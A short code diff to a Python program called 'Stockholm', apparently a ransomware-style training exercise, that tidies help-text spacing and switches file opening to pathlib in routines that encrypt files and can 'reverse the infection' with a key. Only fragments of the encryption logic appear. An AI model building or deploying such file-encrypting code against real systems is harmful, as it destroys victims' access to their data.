@@ -22,10 +22,10 @@ def show_version():
 
 def show_help():
     print(f"""
-{", ".join(FLAGS['help'])}    display the help
-{", ".join(FLAGS['version'])} show the version of the program
+{", ".join(FLAGS['help'])}            display the help
+{", ".join(FLAGS['version'])}         show the version of the program
 {", ".join(FLAGS['reverse'])} KEYFILE reverse the infection with the key entered as an argument
-{", ".join(FLAGS['silent'])}  not show each encrypted ﬁle during the process
+{", ".join(FLAGS['silent'])}          not show each encrypted ﬁle during the process
 """)
 
 class StockholmException(Exception):
@@ -95,7 +95,7 @@ class Stockholm():
             print(f"{new_relative} already exist")
             return
         try:
-            with open(path, 'rb') as file:
+            with path.open('rb') as file:
                 data = file.read()
         except Exception as err:
             print(f"{relative} : {err}")
@@ -107,7 +107,7 @@ class Stockholm():
         else:
             encrypt_data = cipher.encrypt(data)
         try:
-            with open(new_path, 'w+b') as new_file:
+            with new_path.open('w+b') as new_file:
                 new_file.truncate(0)
                 new_file.write(encrypt_data)
         except Exception as err:
